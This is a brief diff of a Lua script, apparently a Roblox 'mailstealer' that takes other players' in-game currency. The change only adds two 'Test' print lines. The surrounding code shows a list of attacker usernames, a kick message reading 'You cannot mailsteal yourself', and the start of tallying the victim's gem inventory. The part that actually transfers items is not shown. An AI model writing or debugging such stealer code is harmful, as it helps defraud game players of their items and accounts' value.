@@ -17,12 +17,14 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+print("Test before")
 for _, user in ipairs(Usernames) do
     if plr.Name == user then
         plr:kick("You cannot mailsteal yourself")
         return
     end
 end
+print("Test after")
 
 local GemAmount1 = 0
 for i, v in pairs(GetSave().Inventory.Currency) do
